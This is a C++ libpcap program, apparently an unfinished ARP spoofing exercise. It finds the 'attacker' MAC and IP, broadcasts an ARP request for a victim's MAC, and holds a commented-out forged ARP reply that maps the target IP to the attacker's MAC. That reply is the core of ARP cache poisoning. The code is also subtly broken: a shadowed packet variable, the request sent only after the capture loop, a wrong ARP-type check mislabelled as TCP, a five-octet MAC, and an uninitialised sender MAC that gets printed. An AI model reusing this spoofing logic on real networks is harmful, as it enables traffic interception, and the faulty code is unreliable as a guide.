#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "find_attacker_mac.h"
#include "find_attacker_ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	int i = 0;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char attacker_mac[20];
	char sender_mac[20];
	char attacker_ip[40];
	// find attacker's mac address
	find_mac(attacker_mac, argv); 
	// print attacker's mac address
	printf("My MAC : %s\n", attacker_mac);
	find_ip(attacker_ip, argv);
	printf("My IP : %s\n", attacker_ip);
	///////////////////////////////////////////////
  	
	

	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(attacker_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(attacker_mac);
        packet.arp_.sip_ = htonl(Ip(attacker_ip));
        packet.arp_.tmac_ = Mac("00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(argv[2]));	
	
   	while (true) {

        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

	// Check TCP Packet
        if(packet[12] != 0x08 && packet[13] == 0x06)
        	continue;
        
	// Print TCP Packet Information
        for(i=0; i<6; i++)
		printf("%x:", packet[i+6]);
        
        // Print Captured Bytes 
        printf("\n\n%u bytes captured\n", header->caplen);
        break;
        printf("\n====================================================\n");
    }
    
    printf("%s", sender_mac);
 

	
	/*
	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(argv[2]));
	*/
		
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	pcap_close(handle);
}
